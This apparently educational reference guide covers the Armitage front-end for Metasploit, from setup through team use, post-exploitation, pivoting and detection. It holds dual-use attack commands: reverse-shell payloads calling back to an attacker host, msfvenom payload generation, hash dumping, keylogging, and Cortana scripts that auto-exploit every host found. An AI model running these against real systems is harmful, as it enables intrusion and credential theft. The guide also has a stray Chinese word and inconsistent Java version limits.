---
title: Armitage
tool: armitage
category: execution
mitre_tactic: execution
mitre_tactic_id: TA0002
difficulty: intermediate
os: linux
language: java
license: BSD-3-Clause
version: "20221206"
created: "2010 by Raphael Mudge"
github: https://github.com/rsmudge/armitage
kali: https://www.kali.org/tools/armitage/
---

# Armitage - Cyber Attack Management for Metasploit

## 1. Introduction & Overview

Armitage is a graphical front-end for the Metasploit Framework that transforms the command-line exploitation experience into a visual, collaborative attack management platform. It visualizes network targets, recommends exploits based on detected services, and exposes Metasploit's post-exploitation capabilities through a point-and-click interface. The tool bridges the gap between Metasploit's raw power and operational accessibility.

**Created:** 2010 by Raphael Mudge, currently maintained by the Kali/OffSec community (Kali package version 20221206). Licensed under BSD-3-Clause.

### What Armitage Does

Armitage connects to Metasploit's RPC daemon (`msfrpcd`) and provides:

- **Network visualization** — discovered hosts appear as icons on a graphical canvas, color-coded by compromise status
- **Exploit recommendation** — right-click any host to see suggested exploits matched to detected services
- **Session management** — all Meterpreter and shell sessions appear in a central panel for one-click interaction
- **Team collaboration** — a `teamserver` mode lets multiple operators share a single Metasploit instance with shared sessions and data
- **Cortana scripting** — an embedded scripting language (based on Sleep/Slash) for automating attack workflows

### When to Use Armitage

| Scenario | Value |
|---|---|
| Red team operations with 5+ operators | Shared session pool eliminates duplicated effort |
| Rapid network exploitation after scanning | Visual exploit suggestions accelerate the attack chain |
| Teaching Metasploit to newcomers | GUI lowers the learning curve without hiding the framework |
| Long-running engagements | Session persistence and logging survive operator disconnection |

### Architecture

```
┌──────────────┐     msfrpcd (55553)     ┌──────────────────┐
│   Armitage   │◄────────────────────────►│  msfrpcd daemon  │
│   GUI (Java) │                          │  (Metasploit RPC)│
└──────┬───────┘                          └────────┬─────────┘
       │                                           │
       │          ┌──────────────────┐             │
       └─────────►│  PostgreSQL DB   │◄────────────┘
                  │  (hosts, creds)  │
                  └──────────────────┘
```

Armitage is a **Java Swing application** written in Java (54.3%) and Slash (45.5%). It requires Java 11 (Java 18+ breaks compatibility). The tool communicates with Metasploit exclusively through the MSFRPC protocol — it never calls `msfconsole` directly.

### Key Differences from msfconsole

| Feature | msfconsole | Armitage |
|---|---|---|
| Interface | Text-based REPL | GUI with drag-and-drop |
| Exploit discovery | Manual `search` commands | Visual menu per host |
| Multi-user | Not supported | Teamserver mode |
| Automation | Resource scripts (.rc) | Cortana scripts (.sl) |
| Session sharing | No | Yes (shared across team) |

---

## 2. Installation & Setup

### Prerequisites

- **Java 11** (OpenJDK 11 JRE) — mandatory, newer versions cause failures
- **Metasploit Framework** — installed and initialized
- **PostgreSQL** — required by Metasploit's database backend
- **Root privileges** — Armitage must run as root

### Install via apt

```bash
sudo apt update && sudo apt install armitage
```

**Explanation:** This installs Armitage and pulls in all dependencies including `metasploit-framework` and `openjdk-11-jre`. The installed size is approximately 11 MB.

### Initialize the Metasploit Database

```bash
sudo msfdb init
sudo systemctl enable postgresql
sudo systemctl start postgresql
```

**Explanation:** `msfdb init` creates the PostgreSQL database and user that Metasploit uses for storing hosts, services, credentials, and loot. Without this, Armitage will fail to connect.

### First Run

```bash
sudo armitage
```

**Explanation:** Launches Armitage and automatically starts `msfrpcd` in the background. The GUI opens with a connection dialog. Accept the defaults (localhost:55553, user `msf`, password `msf`) and click "Connect".

### Manual msfrpcd Start (Advanced)

If you need to configure msfrpcd separately:

```bash
sudo msfrpcd -f -U msf -P msf -S -i 127.0.0.1 -p 55553
```

**Explanation:** Starts the Metasploit RPC daemon in foreground mode (`-f`) with SSL enabled (`-S`). The `-i` flag binds to a specific interface. Use this when running msfrpcd on a remote host.

### Teamserver Setup (Multi-user)

```bash
sudo teamserver 192.168.1.202 s3cr3t
```

**Explanation:** Starts the team server on the specified external IP with a shared password. Team members connect from their Armitage clients to `192.168.1.202:55553` using the shared password. All operators share the same session pool and host data.

### Build from Source (Alternative)

```bash
git clone https://github.com/rsmudge/armitage.git
cd armitage
./package.sh
cd release/unix
./armitage
```

**Explanation:** The `package.sh` script compiles the Java sources and produces a distributable in `release/`. Use this for the latest development version or to patch specific issues.

### Java Version Fix (Kali 2022+)

```bash
sudo apt install -y openjdk-11-jdk
sudo update-alternatives --config java
# Select openjdk-11 from the list
java -version
```

**Explanation:** Kali's default Java may be version 17 or 18, which breaks Armitage. Force Java 11 as the system default before running Armitage. This is the single most common installation issue.

### PostgreSQL Trust Configuration

```bash
sudo nano /etc/postgresql/*/main/pg_hba.conf
# Change line 97 from "scram-sha-256" to "trust"
sudo systemctl restart postgresql
```

**Explanation:** Some Armitage/MSFRPC combinations fail PostgreSQL authentication with `scram-sha-256`. Switching to `trust` for local connections resolves this. Only appropriate for local-only PostgreSQL instances.

---

## 3. Basic Usage

### Connecting to Metasploit

After launching Armitage, fill in the connection dialog:

| Field | Default | Description |
|---|---|---|
| Host | `127.0.0.1` | msfrpcd address |
| Port | `55553` | msfrpcd port |
| User | `msf` | RPC username |
| Password | `msf` | RPC password |
| Disconnect | unchecked | Set this for teamserver |

Click "Connect". Armitage will prompt to start msfrpcd if it is not running — click "Yes".

### Host Discovery (Nmap Scanning)

```bash
# Via Armitage GUI:
# Hosts → Nmap Scan → Quick Scan
# or
# Hosts → Nmap Scan → Intense Scan, all TCP ports

# Equivalent msfconsole commands for understanding:
# db_nmap -sV 192.168.1.0/24
```

**Explanation:** Armitage's Nmap scan menu wraps `db_nmap`, which runs Nmap and automatically imports results into the Metasploit database. Discovered hosts appear on the canvas as computer icons.

### Right-Click Attack Workflow

1. **Right-click a host** → "Attack" → see matched exploits
2. **Select an exploit** → configure options in the dialog
3. **Click "Launch"** → Armitage runs the exploit via MSFRPC
4. **Sessions panel** → new sessions appear for successful compromises

**Explanation:** This is the core Armitage workflow. The exploit list is filtered based on detected services (from the Nmap scan). Not every exploit will work — the list is suggestions, not guarantees.

### Essential Commands

```bash
# Scan a single host
sudo nmap -sV -O 192.168.1.100

# Start msfrpcd manually (if not using armitage launcher)
sudo msfrpcd -f -P msf

# Connect armitage to a remote teamserver
# In Armitage: File → Connect → set Host to teamserver IP
```

**Explanation:** Armitage relies on Nmap for discovery and msfrpcd for exploitation. Understanding these underlying tools is essential when the GUI doesn't behave as expected.

### Using the Meterpreter Console

```
# Inside Armitage's Meterpreter tab:
sysinfo                    # Display target system information
getuid                     # Current user on compromised host
hashdump                   # Dump password hashes
getsystem                  # Attempt privilege escalation
upload /tmp/agent.exe C:\\Users\\Public\\  # File transfer
shell                      # Drop to system shell
```

**Explanation:** The Meterpreter console in Armitage passes commands directly to the Meterpreter session. Each command runs in the context of the compromised session. The `hashdump` command requires SYSTEM privileges.

### Post-Exploitation via GUI

| Menu Path | Action |
|---|---|
| Sessions → Interact | Open Meterpreter shell for a session |
| Sessions → Explore | Open File Browser for compromised host |
| View → Credentials | View collected credential data |
| Hosts → Clear Database | Reset all discovered data |

**Explanation:** Armitage's post-exploitation features are accessed through the session management panel. The File Browser provides a graphical file manager for the remote filesystem.

---

## 4. Intermediate Usage

### Cortana Scripting

Armitage embeds Cortana, a scripting language based on Sleep/Slash, for automating attack workflows:

```bash
# Example Cortana script (attack.cna):
# Auto-exploit Samba vulnerabilities on discovered hosts

on ready {
    println("Armitage is ready.");
}

on host {
    println("New host: " . $1);

    # Right-click actions are automated via Cortana
    launch('exploit/multi/samba/usermap_script', $1, "445");
}
```

**Explanation:** Cortana scripts (`.cna` files) respond to Armitage events like host discovery and session creation. Load them via Armitage → Script Manager → Load. Cortana uses Slash syntax (a Perl-like language).

### Launching Exploits from Console

```
# In Armitage's Metasploit Console tab:
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 192.168.1.0/24
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit -j
```

**Explanation:** The `-j` flag runs the exploit as a background job, allowing you to launch multiple exploits simultaneously. Armitage's Console tab is a direct interface to `msfconsole` — all commands work identically.

### Credential Harvesting

```
# In Meterpreter session:
hashdump > /tmp/hashes.txt
creds add -u administrator -p P@ssw0rd -t NTLM

# Or via Armitage:
# View → Credentials → manually add found credentials
```

**Explanation:** Armitage maintains a credential database that aggregates hashes and passwords found during the engagement. This data is stored in the PostgreSQL database and shared across team sessions.

### Port Forwarding

```
# In Meterpreter:
portfwd add -l 3389 -p 3389 -r 192.168.1.100
# Now connect to localhost:3389 for RDP access
```

**Explanation:** Port forwarding through Meterpreter creates a tunnel from your attacking machine through the compromised host to the target. This is essential for reaching internal services not directly routable.

### Payload Generation via Armitage

```
# Use msfvenom (called from Armitage or terminal):
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o /tmp/shell.exe

# Or in Armitage:
# Attacks → Hail Mary → pick payloads to generate
```

**Explanation:** Armitage's payload generation delegates to `msfvenom`. The "Hail Mary" feature attempts to automatically exploit all discovered hosts — useful for time-constrained engagements but noisy.

### Multi-Handler Setup

```
# In Armitage Console:
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j
```

**Explanation:** Always set up a listener before generating payloads or launching client-side attacks. The handler runs in the background and catches incoming Meterpreter connections. Armitage automatically routes caught sessions to the GUI.

---

## 5. Advanced Usage

### Red Team Collaboration Workflow

```
# Step 1: Team lead starts teamserver
sudo teamserver 10.0.0.1 s3cr3tP@ss

# Step 2: Each operator connects
# File → Disconnect, then File → Connect
# Host: 10.0.0.1, Port: 55553, User: operator1, Password: s3cr3tP@ss
# Uncheck "disconnect"

# Step 3: Shared operations
# - All hosts visible to all operators
# - Sessions can be claimed by right-clicking → "Steal Session"
# - Shared credential database
# - Console tab shows all operator activity
```

**Explanation:** The teamserver mode is Armitage's most powerful feature for red team operations. Sessions are pooled — if operator A finds a session, operator B can interact with it. This prevents duplicate exploitation and enables role-based分工 (e.g., one operator scans, another exploits, a third does post-exploitation).

### Custom Cortana Attack Automation

```bash
# automated_lateral.cna
# Auto-exploit SMB on every new host

on host {
    $service = service($1, "445");

    if ($service contains "microsoft-ds" ||
        $service contains "netbios-ssn") {
        println("SMB open on " . $1 . ", attempting exploit...");

        launch('exploit/windows/smb/ms17_010_eternalblue', $1, "445");
    }
}
```

**Explanation:** Cortana scripts enable autonomous exploitation workflows. The `on host` handler fires for each newly discovered host. The `service()` function checks what's running on a specific port. `launch()` fires an exploit in the background. This is useful for large-scale engagements where manual exploitation is impractical.

### Database Querying

```
# In Armitage Console:
hosts -c address,os_name,purpose    # List all hosts
services -c port,name -S smb        # Filter services by name
creds                               # Show all collected credentials
loot                                # Show collected loot files
```

**Explanation:** Armitage stores all reconnaissance and exploitation data in Metasploit's PostgreSQL database. These queries return structured data that can be piped into reports or used for further analysis.

### Export and Reporting

```
# Generate a report:
# Armitage → Hosts → Export → choose format

# Or from console:
# db_export -f xml /tmp/report.xml
```

**Explanation:** Armitage can export host data in XML format for integration with external reporting tools. The export includes hosts, services, vulnerabilities, and credentials found during the engagement.

### Advanced Session Management

```
# In Meterpreter:
sessions -l                    # List all sessions
sessions -i 2                  # Interact with session 2
sessions -k 3                  # Kill session 3
sessions -s /tmp/autopwn.rc    # Run resource script on session

# Post-exploitation:
hashdump                       # NTLM hashes
getsystem                      # Escalate to SYSTEM
migrate 1234                   # Migrate to process PID 1234
keyscan_start                  # Start keylogger
keyscan_dump                   # Dump captured keystrokes
```

**Explanation:** Session management is critical during engagements. `migrate` moves Meterpreter into a different process (useful when the original process crashes or is monitored). `keyscan` captures keystrokes including password fields.

---

## 6. Real-World Scenarios

### Scenario 1: Internal Network Penetration Test

**Context:** Full internal network engagement, 10.0.0.0/24 scope, 3-person team.

```bash
# Phase 1: Reconnaissance
sudo nmap -sV -O -oX /tmp/scan.xml 10.0.0.0/24

# Phase 2: Import to Armitage
# Armitage → Hosts → Import → /tmp/scan.xml

# Phase 3: Team exploitation
# Each operator selects unexploited hosts
# Right-click → Attack → pick exploit → Launch

# Phase 4: Post-exploitation
# Sessions → Interact → hashdump on each session
# Meterpreter → getsystem for privilege escalation
# Meterpreter → load kiwi for credential harvesting
```

**Explanation:** This workflow scales to large networks. The team splits hosts by subnet or department. Armitage's shared session pool prevents redundant exploitation attempts and provides a unified view of the attack surface.

### Scenario 2: Vulnerability Validation

**Context:** Verify that a critical patch (MS17-010) was applied across all Windows servers.

```bash
# Step 1: Import Nmap results of server subnet
# Step 2: Use Cortana to auto-test EternalBlue

# Cortana script (validate_patch.cna):
on host {
    if (is_windows($1)) {
        launch('exploit/windows/smb/ms17_010_eternalblue', $1, "445");
    }
}

# Step 3: Review results
# Unexploited hosts = patched
# Exploited hosts = vulnerable
```

**Explanation:** Automated exploitation scripts provide a binary patch-validation mechanism. Hosts where the exploit fails are likely patched. This is faster and more reliable than manual verification across hundreds of systems.

### Scenario 3: Rapid Exploitation During Time-Limited Engagement

**Context:** 8-hour penetration test window, need maximum coverage quickly.

```bash
# Step 1: Full port scan
sudo nmap -sV -p- 192.168.1.0/24

# Step 2: Import and auto-exploit
# Armitage → Attacks → Hail Mary

# Step 3: Triage sessions
# Sort by privilege level
# Focus on high-value targets (Domain Controllers, DB servers)

# Step 4: Quick credential harvest
# On each session: hashdump
# Combine with pass-the-hash if possible
```

**Explanation:** "Hail Mary" attempts every matching exploit against every host. It is noisy and will trigger IDS/IPS alerts. Reserve this for engagements where speed matters more than stealth. Always have a callback plan — successful sessions need immediate attention.

### Scenario 4: Post-Exploitation Pivot

**Context:** Compromised host is dual-homed with access to a segmented network (172.16.0.0/24).

```bash
# Step 1: Get Meterpreter on dual-homed host
# Step 2: Set up route through session
run autoroute -s 172.16.0.0/24

# Step 3: Scan through pivot
# Armitage → Hosts → Nmap Scan → targets in 172.16.0.0/24

# Step 4: Exploit internal targets
# Right-click internal hosts → Attack
```

**Explanation:** Armitage respects Metasploit's routing table. Once `autoroute` establishes a route through a compromised session, all subsequent scans and exploits traverse the pivot. This is essential for reaching air-gapped or segmented networks.

---

## 7. Detection & Defense

### Indicators of Compromise (IOCs)

| Indicator | Detail |
|---|---|
| MSFRPC traffic | TCP connections to port 55553 (SSL) or 55554 |
| PostgreSQL connections | Unexpected local PostgreSQL activity from msfrpcd |
| Java process | `java` process running Armitage JAR files |
| Meterpreter signatures | Known Meterpreter DLL injection patterns in memory |
| Nmap patterns | Burst port scanning from a single source |

### Detection Methods

**Network monitoring:**
- Alert on repeated connections to port 55553/55554
- Detect Nmap SYN scans (flagged by most IDS as `ET SCAN`)
- Monitor for Meterpreter reverse TCP connections on unusual ports

**Endpoint monitoring:**
- Process creation logs: `java` spawning `msfrpcd` or `msfconsole`
- Windows: Meterpreter DLL injection (signature-based detection)
- Memory forensics: `malfind` in Volatility finds Meterpreter payloads

**Log analysis:**
- Metasploit logs at `/opt/metasploit/apps/pro/ui/log/` (if Pro)
- PostgreSQL logs for suspicious queries
- Armitage session logs in `~/.armitage/`

### Hardening Recommendations

1. **Network segmentation** — limit MSFRPC to management VLANs only
2. **Firewall rules** — block outbound Meterpreter reverse shells (limit egress)
3. **EDR/AV** — deploy signature-based detection for Meterpreter and common payloads
4. **Patch management** — MS17-010, MS08-067, and other critical SMB vulnerabilities
5. **User education** — prevent initial foothold through phishing awareness

---

## 8. Troubleshooting

### Common Issues

**"Java 16+ is not supported" error:**
```bash
sudo apt install openjdk-11-jdk
sudo update-alternatives --config java
# Select openjdk-11
```

**Armitage won't connect to msfrpcd:**
```bash
# Check if msfrpcd is running:
sudo netstat -tlnp | grep 55553

# Restart msfrpcd:
sudo msfrpcd -f -P msf -S

# Test connection manually:
curl -k https://127.0.0.1:55553/api/1.0/auth/login -d "username=msf&password=msf"
```

**"Find Attacks" not working:**
```bash
# This is a known issue in some versions
# Use manual exploit selection instead
# Or use the Console tab for direct msfconsole commands
```

**Sessions appear but can't interact:**
```bash
# Check session validity in msfconsole:
sessions -l
sessions -i 1

# If session is dead, kill it:
sessions -k 1
```

**Database errors ("Could not connect to database"):**
```bash
sudo systemctl restart postgresql
sudo msfdb reinit
```

**Teamserver fingerprint mismatch:**
```bash
# Teammembers must verify the fingerprint on first connection
# Compare the fingerprint shown by teamserver output
# with what Armitage displays in the connect dialog
```

**Memory/performance issues with large scans:**
- Limit concurrent jobs: Armitage → View → Preferences → set max concurrent
- Use targeted scans instead of full subnet scans
- Close unused sessions to free Metasploit resources

---

## Resources

- **Armitage Manual:** http://www.fastandeasyhacking.com
- **GitHub (Kali fork):** https://github.com/r00t0v3rr1d3/armitage
- **Kali Package:** https://www.kali.org/tools/armitage/
- **Metasploit Documentation:** https://docs.metasploit.com/
- **Cortana Scripting Guide:** http://www.fastandeasyhacking.com/manual/
- **Original Author:** Raphael Mudge (rsmudge)
- **License:** BSD-3-Clause
